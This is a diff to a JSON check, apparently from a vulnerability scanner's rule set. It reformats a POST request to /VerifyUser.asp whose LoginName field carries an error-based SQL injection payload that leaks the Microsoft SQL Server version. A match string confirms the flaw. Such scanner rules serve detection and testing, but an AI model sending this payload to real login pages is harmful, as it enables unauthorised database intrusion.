@@ -4,8 +4,14 @@
     "port": [
         80
     ],
-    "suffix":"/VerifyUser.asp",
-    "data": "LoginName=admin'%20AND%204996=CONVERT(INT,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20AND%20'kmly'='kmly&Password=admin&Validatepwds=&LockNum=err&UserRank=0",
+    "suffix": "/VerifyUser.asp",
+    "data": {
+        "LoginName": "admin'%20AND%204996=CONVERT(INT,(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version))%20AND%20'kmly'='kmly",
+        "Password": "admin",
+        "Validatepwds": "",
+        "LockNum": "err",
+        "UserRank": "0"
+    },
     "hits": [
         "GAO JI@Microsoft SQL Server"
     ]
